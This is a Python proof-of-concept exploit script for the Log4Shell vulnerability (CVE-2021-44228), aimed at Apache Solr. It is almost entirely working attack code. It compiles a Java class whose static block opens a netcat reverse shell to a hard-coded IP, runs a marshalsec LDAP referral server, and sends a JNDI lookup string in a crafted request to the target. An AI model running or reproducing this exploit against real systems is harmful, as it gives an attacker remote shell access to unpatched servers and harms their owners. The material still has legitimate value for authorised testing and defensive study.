#!/usr/bin/env python3

import requests
import os
import subprocess
import sys
import argparse
import threading
import time
from colorama import Fore


green = Fore.GREEN
red = Fore.RED
reset = Fore.RESET




def get_arguments():
	parser = argparse.ArgumentParser(description='CVE-2021-44228 PoC for web requests')
	parser.add_argument('-i', dest='ip_addr', type=str, help='IP address to target')
	parser.add_argument('-j', dest='java', default='jdk1.8.0_20/bin/java', type=str, help='Java version to use')
	parser.add_argument('-p', dest='rport', type=str, help='Remote port to target')
	parser.add_argument('-u', dest='user_input', default='/solr/admin/cores?foo=', type=str, help='The vulnerable input point (the rest of the URL  ex: /solr/admin/cores?foo=)')
	parser.add_argument('-l', dest='local_ip', type=str, help='The local IP address used for the crafted URL')
	parser.add_argument('-L', dest='local_port', default='8000', type=str, help='The local port used to point at the python web server')
	args = parser.parse_args()
	return args








#CHANGE THIS IP ADDRESS OR ENTIRE PAYLOAD
java_payload = ("""

	public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.6.20.239 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}



""")




#write the payload to a file
def write_payload():
	with open("Exploit.java", "w") as f:
		f.write(java_payload)
		f.close()
		print(red + "\n[+] " + reset + "Compiling the payload using javac\n")
		os.system("./jdk1.8.0_20/bin/javac Exploit.java")
		

#send the payload via a crafted URL
def send_payload():

	#Craft jndi payload
	jndi = "${jndi:ldap://" + args.local_ip + ":" + "1389/Exploit}"
	print(jndi)

	#Create the url and send the request
	url = "http://" + args.ip_addr + ":" + args.rport + args.user_input + jndi
	print(url)
	send_exploit = requests.get(url)
	

#starts the LDAPRefServer, run a python web server on port 8000 in the directory where the script is
def marshalsec():
	#Compile the payload

	#use marshalsec to run the LDAPRefServer
	os.system(f"./jdk1.8.0_20/bin/java -cp marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://{args.local_ip}:8000/#Exploit")
	


print(red + "\n****PoC for CVE-2021-44228****.")
print("Based on Apache Solr, change values as needed\n")
print("Make sure you are running a web server on port 8000(python works great)\nand running a netcat listener on the port specified in the java payload\n" + reset)


args = get_arguments()

print(red + "[+]" + reset + "Starting marshalsec LDAPRefServer\n")
threading.Thread(target=marshalsec).start()
time.sleep(3)

print(red + "\n[+] " + reset + "Writing the payload to a file\n")
write_payload()


print(red + "\n[+]" + reset + "Sending the payload, check your listener\n")
send_payload()



